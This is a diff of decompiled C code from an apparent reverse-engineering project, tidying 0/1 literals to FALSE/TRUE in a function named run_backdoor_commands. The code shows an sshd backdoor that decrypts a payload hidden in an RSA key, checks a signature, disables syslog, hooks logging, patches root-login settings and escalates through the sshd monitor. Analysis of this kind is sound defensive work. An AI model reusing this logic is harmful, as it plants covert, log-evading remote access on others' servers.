@@ -109,15 +109,15 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
     puVar31 = puVar31 + 1;
   }
   if (ctx != (global_context_t *)0x0) {
-    if ((((ctx->disable_backdoor == 0) && (key != (RSA *)0x0)) &&
+    if ((((ctx->disable_backdoor == FALSE) && (key != (RSA *)0x0)) &&
         (piVar1 = ctx->imported_funcs, piVar1 != (imported_funcs_t *)0x0)) &&
        ((ppVar2 = piVar1->RSA_get0_key, ppVar2 != (pfn_RSA_get0_key_t)0x0 &&
         (piVar1->BN_bn2bin != (_func_58 *)0x0)))) {
       if (do_orig == (BOOL *)0x0) {
-        ctx->disable_backdoor = 1;
-        return 0;
+        ctx->disable_backdoor = TRUE;
+        return FALSE;
       }
-      *do_orig = 1;
+      *do_orig = TRUE;
       (*ppVar2)(key,(BIGNUM **)&tgt_uid,(BIGNUM **)&tgt_gid,(BIGNUM **)0x0);
       if ((((_tgt_uid != (BIGNUM *)0x0) && (_tgt_gid != (BIGNUM *)0x0)) &&
           ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
@@ -139,10 +139,10 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
             rsa_e = (BIGNUM *)CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
             lStack_7b = lStack_2d3;
             BVar16 = secret_data_get_decrypted((u8 *)&payload_size,ctx);
-            if ((BVar16 != 0) &&
+            if ((BVar16 != FALSE) &&
                (BVar16 = chacha_decrypt((u8 *)&data_s1,uVar14 - 0x10,(u8 *)&payload_size,
                                         (u8 *)&rsa_e,(u8 *)&data_s1,ctx->imported_funcs),
-               BVar16 != 0)) {
+               BVar16 != FALSE)) {
               monitor_reqtype_ptr = (int *)0x0;
               pcStack_548 = (cmd_arguments_t *)0x0;
               piVar37 = &payload_size;
@@ -228,12 +228,12 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                      ((ppsVar6 != psVar5->host_pubkeys &&
                       (((((uint)psVar5->have_ssh2_key < 2 &&
                          (BVar16 = count_pointers(ppsVar6,&uStack_5a0,ctx->libc_imports),
-                         BVar16 != 0)) &&
+                         BVar16 != FALSE)) &&
                         (BVar16 = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,(u64 *)&tmp,
                                                  ctx->libc_imports), uVar27 = uStack_5a0,
-                        BVar16 != 0)) && (uStack_5a0 == _tmp)))))) {
+                        BVar16 != FALSE)) && (uStack_5a0 == _tmp)))))) {
                     BVar16 = secret_data_get_decrypted((u8 *)&body_r8,ctx);
-                    if (BVar16 != 0) {
+                    if (BVar16 != FALSE) {
                       lVar36 = 0;
                       do {
                         signature._0_4_ = (uint)uVar27;
@@ -243,7 +243,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                                                   (u8 *)&monitor_reqtype_ptr,_key_idx + 4,0x25c,
                                                   (u8 *)&data_s1,(u8 *)&body_r8,ctx);
                         lVar36 = lVar36 + 1;
-                      } while (BVar16 == 0);
+                      } while (BVar16 == FALSE);
                       ctx->sshd_host_pubkey_idx = uVar14;
                       if ((uVar29 != 2) || (-1 < (char)local_2e0[0])) {
                         if (lVar24 == 0) {
@@ -258,21 +258,22 @@ LAB_00109aa2:
                                 (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                                (p_Var8 = ctx->libc_imports->setlogmask, p_Var8 == (_func_27 *)0x0))
                             {
-                              ctx->sshd_log_ctx->syslog_disabled = 0;
+                              ctx->sshd_log_ctx->syslog_disabled = FALSE;
                               if ((local_2e0[0] & 5) == 5) goto LAB_0010a1ba;
                             }
                             else {
                               (*p_Var8)(-0x80000000);
-                              ctx->sshd_log_ctx->syslog_disabled = 1;
+                              ctx->sshd_log_ctx->syslog_disabled = TRUE;
                             }
                             uVar18 = (*ctx->libc_imports->getuid)();
                             bVar13 = local_2e0[0];
                             ctx->uid = uVar18;
                             bVar35 = local_2e0[0] & 0x10;
-                            if (((bVar35 == 0) || (ctx->sshd_log_ctx->log_hooking_possible != 0)) &&
-                               (((local_2e0[0] & 2) == 0 ||
-                                ((BVar16 = sshd_configure_log_hook((cmd_arguments_t *)local_2e0,ctx)
-                                 , BVar16 != 0 || (bVar35 == 0)))))) {
+                            if (((bVar35 == 0) || (ctx->sshd_log_ctx->log_hooking_possible != FALSE)
+                                ) && (((local_2e0[0] & 2) == 0 ||
+                                      ((BVar16 = sshd_configure_log_hook
+                                                           ((cmd_arguments_t *)local_2e0,ctx),
+                                       BVar16 != FALSE || (bVar35 == 0)))))) {
                               if (uVar29 == 0) {
                                 if (((char)local_2e0[1] < '\0') ||
                                    (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
@@ -312,7 +313,7 @@ LAB_00109c8a:
                                         psVar9 = ctx->sshd_ctx;
                                         if (((psVar9 != (sshd_ctx_t *)0x0) &&
                                             (psVar9->mm_answer_keyallowed_ptr != (void *)0x0)) &&
-                                           (psVar9->have_mm_answer_keyallowed != 0)) {
+                                           (psVar9->have_mm_answer_keyallowed != FALSE)) {
                                           if ((char)local_2e0[1] < '\0') goto LAB_00109d36;
                                           piVar37 = psVar9->permit_root_login_ptr;
                                           if (piVar37 != (int *)0x0) {
@@ -329,17 +330,17 @@ LAB_00109d36:
                                                 }
                                                 uStack_5a0 = CONCAT44(uStack_5a0._4_4_,0xffffffff);
                                                 if ((bVar13 & 0x20) == 0) {
-                                                  iVar15 = sshd_get_client_socket
+                                                  BVar16 = sshd_get_client_socket
                                                                      (ctx,(int *)&uStack_5a0,1,
                                                                       DIR_READ);
                                                 }
                                                 else {
-                                                  iVar15 = sshd_get_usable_socket
+                                                  BVar16 = sshd_get_usable_socket
                                                                      ((int *)&uStack_5a0,
                                                                       local_2e0[1] >> 3 & 0xf,plVar4
                                                                      );
                                                 }
-                                                if (iVar15 != 0) {
+                                                if (BVar16 != FALSE) {
                                                   iVar15 = (int)uStack_5a0;
                                                   uStack_5a1 = 0;
                                                   _tmp = _tmp & 0xffffffff00000000;
@@ -426,10 +427,11 @@ LAB_00109d36:
                                       }
                                       else if (iVar15 == 1) {
                                         BVar16 = sshd_patch_variables
-                                                           (local_2e0[1] & 1,local_2e0[0] >> 6 & 1,
-                                                            local_2e0[1] >> 1 & 1,(uint)local_2e0[3]
-                                                            ,ctx);
-                                        if (BVar16 != 0) {
+                                                           (local_2e0[1] & TRUE,
+                                                            local_2e0[0] >> 6 & TRUE,
+                                                            local_2e0[1] >> 1 & TRUE,
+                                                            (uint)local_2e0[3],ctx);
+                                        if (BVar16 != FALSE) {
 LAB_0010a076:
                                           body_r8 = (u8 *)CONCAT71(body_r8._1_7_,1);
                                           pcStack_548 = (cmd_arguments_t *)0x0;
@@ -522,10 +524,10 @@ LAB_00109fb9:
                                     _v = key;
                                     BVar16 = sshd_proxy_elevate((monitor_data_t *)
                                                                 &monitor_reqtype_ptr,ctx);
-                                    if (BVar16 != 0) {
-                                      ctx->disable_backdoor = 1;
-                                      *do_orig = 0;
-                                      return 1;
+                                    if (BVar16 != FALSE) {
+                                      ctx->disable_backdoor = TRUE;
+                                      *do_orig = FALSE;
+                                      return TRUE;
                                     }
                                   }
                                 }
@@ -566,7 +568,7 @@ LAB_00109b6c:
                           }
                         }
 LAB_0010a1ba:
-                        ctx->disable_backdoor = 1;
+                        ctx->disable_backdoor = TRUE;
                         piVar37 = &payload_size;
                         for (lVar24 = 0x39; lVar24 != 0; lVar24 = lVar24 + -1) {
                           *(undefined1 *)piVar37 = 0;
@@ -574,14 +576,14 @@ LAB_0010a1ba:
                         }
                         if ((local_2e0[0] & 1) != 0) {
                           if (ctx->libc_imports == (libc_imports_t *)0x0) {
-                            return 0;
+                            return FALSE;
                           }
                           p_Var12 = ctx->libc_imports->exit;
                           if (p_Var12 == (_func_19 *)0x0) {
-                            return 0;
+                            return FALSE;
                           }
                           (*p_Var12)(0);
-                          return 0;
+                          return FALSE;
                         }
                         goto LAB_0010a11a;
                       }
@@ -614,7 +616,7 @@ LAB_0010a1ba:
                                                       ctx->payload_data_size,
                                                       auStack_2d9 + uVar28 + uVar38 + -2,
                                                       ed448_raw_key,ctx);
-                            if (BVar16 != 0) goto LAB_00109a97;
+                            if (BVar16 != FALSE) goto LAB_00109a97;
                           }
                         }
                       }
@@ -627,16 +629,16 @@ LAB_0010a1ba:
         }
       }
 LAB_0010a112:
-      ctx->disable_backdoor = 1;
+      ctx->disable_backdoor = TRUE;
       goto LAB_0010a11a;
     }
-    ctx->disable_backdoor = 1;
+    ctx->disable_backdoor = TRUE;
   }
   if (do_orig == (BOOL *)0x0) {
-    return 0;
+    return FALSE;
   }
 LAB_0010a11a:
-  *do_orig = 1;
-  return 0;
+  *do_orig = TRUE;
+  return FALSE;
 }
 
